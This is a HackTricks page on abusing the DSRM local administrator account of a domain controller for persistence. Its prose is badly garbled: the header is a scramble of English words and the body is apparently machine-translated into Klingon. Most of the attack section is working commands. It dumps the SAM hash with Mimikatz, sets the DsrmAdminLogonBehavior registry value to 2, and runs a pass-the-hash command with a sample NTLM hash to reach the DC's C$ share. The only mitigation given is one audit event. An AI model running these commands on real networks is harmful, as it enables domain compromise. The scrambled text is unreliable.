<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <strong>AWStaHvIS</strong> <strong>hacktricks.xyz</strong> <strong>training</strong> <strong>Daq</strong> <strong>puS</strong> <strong>!</strong></summary>

<strong>HackTricks</strong> <strong>poH</strong> <strong>support</strong> <strong>ways</strong>:

* <strong>HackTricks</strong> <strong>advertised</strong> <strong>company</strong> <strong>company</strong> <strong>download</strong> <strong>HackTricks</strong> <strong>PDF</strong> <strong>Check</strong> <strong>SUBSCRIPTION PLANS</strong> <strong>ghop</strong> <strong>https://github.com/sponsors/carlospolop</strong>!
* <strong>PEASS</strong> <strong>HackTricks</strong> <strong>swag</strong> <strong>official</strong> <strong>Get</strong> <strong>https://peass.creator-spring.com</strong>
* <strong>PEASS Family</strong> <strong>Discover</strong> <strong>NFTs</strong> <strong>exclusive</strong> <strong>collection</strong> <strong>https://opensea.io/collection/the-peass-family</strong>
* <strong>Join</strong> 💬 <strong>Discord group</strong> <strong>https://discord.gg/hRep4RUj7f</strong> <strong>telegram group</strong> <strong>https://t.me/peass</strong> <strong>follow</strong> 🐦 <strong>Twitter</strong> <strong>@carlospolopm</strong> <strong>https://twitter.com/hacktricks_live</strong>.
* <strong>Share</strong> <strong>hacking tricks</strong> <strong>submitting</strong> <strong>PRs</strong> <strong>HackTricks</strong> <strong>HackTricks Cloud</strong> <strong>github repos</strong> <strong>https://github.com/carlospolop/hacktricks</strong> <strong>https://github.com/carlospolop/hacktricks-cloud</strong>.

</details>


# DSRM Credentials

**DC** <strong>local administrator</strong> <strong>account</strong> <strong>inside</strong> <strong>each</strong> <strong>exists</strong>. **Admin privileges** <strong>machine</strong> <strong>use</strong> <strong>mimikatz</strong> <strong>dump</strong> <strong>local Administrator hash</strong>. **Registry modification** <strong>activate</strong> <strong>password</strong> <strong>remotely access</strong> <strong>local Administrator user</strong>.\
**DC** <strong>inside</strong> <strong>local Administrator</strong> <strong>user</strong> <strong>hash</strong> <strong>dump</strong> <strong>need</strong> <strong>First</strong>:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
**ghItlhvam** vaj **'e'** vItlhutlh. 'ej registry key **"0"** vaj **ghaH** 'e' vItlhutlh, **"2"** vItlhutlh.
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
**DaH, PTH vItlhutlh C$ content vItlhutlh 'ej shell jabbogh.** Qapvam, PTH vItlhutlhDaq vItlhutlh hash vIleghlaHghach (PTH) vItlhutlh 'ej **"domain" vItlhutlhDaq 'oH DC machine name Hoch.**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigation

* Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
